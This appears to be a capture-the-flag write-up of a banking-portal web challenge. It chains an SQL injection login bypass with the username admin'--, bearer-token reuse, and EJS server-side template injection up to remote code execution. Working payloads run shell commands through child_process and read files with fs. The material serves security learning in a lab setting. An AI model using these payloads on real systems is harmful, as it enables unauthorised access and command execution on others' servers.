# Challenge Overview

> _A banking portal with “legacy” code and forgotten endpoints. Something hidden waits behind the login screen. Find it. Break it. Claim the flag._

![1](<images/Pasted image 20251208180821.png>)

# Step 1: Logging In....Without Credentials??

>_Something hidden waits behind the login screen._

This means we need to login - but we don't have the credentials?! So how are we going to login?

>_A banking portal with “legacy” code._

Aah there you go.  Legacy code - means outdated code(in short it hasn't been tested a lot and can be vulnerable to the early vulns)

So I think whats the most common username for high profile accounts

![2](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExenYxNmU0NmVjYm9kZ2k3dDV1YnhxNnlxdDR1Y3o2M2k1OXBmeXF4YiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/a5viI92PAF89q/giphy.gif)

**admin** ... It has to be admin. So I try admin and add the most common sqli trick ever.. Commenting out the username(you must fill the password field as it is a required field)
 ```
 username: admin'--
password: anything

 ```

![3](<images/Pasted image 20251208182704.png>)

And… we’re in.  
But _where_?

We get redirected to `/dashboard`, but

![4](<images/Pasted image 20251208182742.png>)

When we check burpsuite , we get

![5](<images/Pasted image 20251208183619.png>)

A 403 error❌ -- meaning the login doesn't automatically attach a token to the users request when he's redirected to the dashboard.

So i retrace my steps back to the login page and capture the token on burpsuite.

![6](<images/Pasted image 20251208183125.png>)

and there we have it a token in the response . All we'll have to do is include it in all our requests.

Here is how you add it:

``Authorization: Bearer <your_token_here>``


Lets include it on our previous request to /dashboard

![7](<images/Pasted image 20251208183703.png>)

 We get a 200 OK ☑️. 
 
Request the response to browser (for those who don't know how don't worry . Just right click the response select Request in browser on the menu that pops up , in original session, copy the link and paste in your browser.)

After doing all this we finally get to the dashboard

![8](<images/Pasted image 20251208184107.png>)

and it says *hey admin*. Wait , I'm admin.

![9](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOTFsdGQ3dnFyY2l0ZGhhM3FwNmE1dnUyenlob3N5c29uazhqZzNzcSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/UiBdsfS6RQU92/giphy.gif)

There is an Admin Panel button clicking it redirects us to another page.

![10](<images/Pasted image 20251208184546.png>)

Same issue as earlier but no worries you already know what to do now.Just add the header to the request in burp.

After all that we are in finally in(I think to myself)

![11](<images/Pasted image 20251208185100.png>)

# Or are we?

# Step 2: Admin Panel - Template Injection (SSTI)

In the Admin Panel there was a **Generate Report** form that accepted an arbitrary EJS template string. The UI instructions showed examples like:

		<h1>User Report for <%= user.username %></h1>

## Testing It

When we provided template expressions, the server evaluated them server-side and rendered the output into the report , indicating EJS was compiling and executing template code on the server. This is an **SSTI** sink.(**server-side template injection**.)
For example:
		 `<i>User Report for <%= user.username %></i>`

renders it italicised:

  ![12](<images/Pasted image 20251208185521.png>)

## 📘 Quick EJS Basics

For those new to EJS here is a little runthrough:

**EJS (Embedded JavaScript)** is a templating engine for Node.js.  
It lets developers mix HTML with JavaScript code using special tags like:

|Tag|Meaning|
|---|---|
|`<%= expression %>`|Evaluate JS, **escape the result**, and print it|
|`<%- expression %>`|Evaluate JS and print the **raw**, unescaped output|
|`<% code %>`|Run JS code **without printing**|

### Example:

`<h1>Hello <%= user.username %></h1>`

It is **normal JavaScript** embedded inside HTML.
- `this` refers to the template context
- `this.constructor` is JavaScript’s `Function` constructor
- `this.constructor.constructor("...")()` creates a new JS function and runs it
- From there you can access:
    - `process`  
    - `require()`
    - filesystem (`fs`)
    - child processes (`child_process.execSync`)


# Step 3: Achieving RCE

Now back to what were doing:

Next: We verified the code execution by printing the Node version with a short payload.

``<%= this.constructor.constructor('return process')().versions.node %>
``

![13](<images/Pasted image 20251208192924.png>)

Result: `18.20.8` (this proved arbitrary server-side JS was being evaluated). The technique uses JavaScript’s `Function`/constructor ability: `this.constructor.constructor('return process')()` is essentially creating a new Function that returns `process`, giving us access to Node’s runtime.
Why this works:

- In EJS templates `this` refers to the template context object. `this.constructor` is `Function` (or something that can produce a Function). `this.constructor.constructor('...')()` creates a new function from source code and executes it in server context — giving access to Node `process`, `require`, etc.(In case you've forgotten , i told you this like 2 and a half scrolls back 🙃)
# Step 4: Turn RCE into useful actions

**Goal:** find the working directory and server entrypoint so we know where to look for files.

**Why:** flags and important files are often in the app directory; knowing `cwd` tells us where files are.

**Payload used**

``<%- (function(){ try { return this.constructor.constructor('return process.cwd()')() } catch(e){ return e.toString() } })() %>``

**What this does:**

- Calls `process.cwd()` to get current working directory (where the server runs)..
- Wrapped in `try/catch` so if something fails we get an error string instead of a crash.(All payloads were wrapped in `try` incase of errors)
- `<%- ... %>` prints raw output (unescaped) so newlines and special characters display clean.
    
**Result:**  `/srv`

![14](<images/Pasted image 20251208213829.png>)

## List files in `/srv`

**Goal:** enumerate `/srv` to find potential flag files or interesting artifacts.

**Payload used**

``
<%- (function(){
  try{
    var p = this.constructor.constructor('return process')();
    var exec = p.mainModule.require('child_process').execSync;
    var out = exec('ls -la  /srv').toString();
    return out;
  }catch(e){ return e.toString() }
})() %>

``
**What this does :**

- Uses `process.mainModule.require('child_process').execSync` to run `ls -la /srv`.
(You might be asking yourself why run `ls -la` instead of `ls` .. it's simple we need to see the permissions on the file if it exists and to see hidden files too)

- `execSync` runs a shell command and returns its output.    

**Result:** listing showed `flag.txt` exists inside `/srv`.**Bingo💥**.

![14](<images/annotely_image.png>)


# STEP 5: Reading the Flag

 Open `/srv/flag.txt` and print its contents.

**Payload used**

```
<%- (function(){ try { return this.constructor.constructor('return process.mainModule.require("fs").readFileSync("/srv/flag.txt","utf8")')() } catch(e){ return e.toString() } })() %>
```

**What this does:

- Uses Node's `fs.readFileSync(path, 'utf8')` to read a file as text.
- `process.mainModule.require('fs')` is used as a reliable way to reach `require()` from the template context.

**Result:** the rendered report showed the flag contents,..success.

![15](<images/Pasted image 20251208205638.png>)


# 🎉 **Final Flag**
We found The flag finally
     ``r00t{ch41n1ng_vuln3r4b1l1t13s_l1k3_4_pr0_8f2a9c4e}``

![16](<images/Pasted image 20251208221751.png>)

## **It had only 42 solves😌**.

A perfect name — we chained:
1. **SQL Injection** → admin login bypass
2. **JWT Header Injection** → authenticated dashboard
3. **SSTI in EJS** → code execution
4. **RCE** → file read
5. **Retrieve flag**

# Resources You can use
* [EJS Docs](https://ejs.co/) 
* [SSTI labs](https://portswigger.net/web-security/server-side-template-injection/)
* [Template Injection Table](https://cheatsheet.hackmanit.de/template-injection-table/)

# ⭐Final Notes
Thanks For reading. This was a fun challenge and it took quite a while to do due to trying different payloads and chaining the vulns.(which may not be clear since the writeup is short but I tried many payloads, I've listed only the ones that worked as a proof of concept).But it was fun nonetheless.

![](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExbXc2c3d4MDV5MXBjbTQ1YWJhaGU1ZDVnNmN1b2l0Mmd6NjZheGQ5ciZlcD12MV9naWZzX3NlYXJjaCZjdD1n/l1J3CbFgn5o7DGRuE/giphy.gif)

Writeup by : [Shanks](http://github.com/shanksCx)

[![X (formerly Twitter)](https://img.shields.io/badge/X-%23000000.svg?style=for-the-badge&logo=X&logoColor=white)](https://x.com/ShanksCx)

Don't be shy and follow. Add me on discord if you want  _@shankscx_



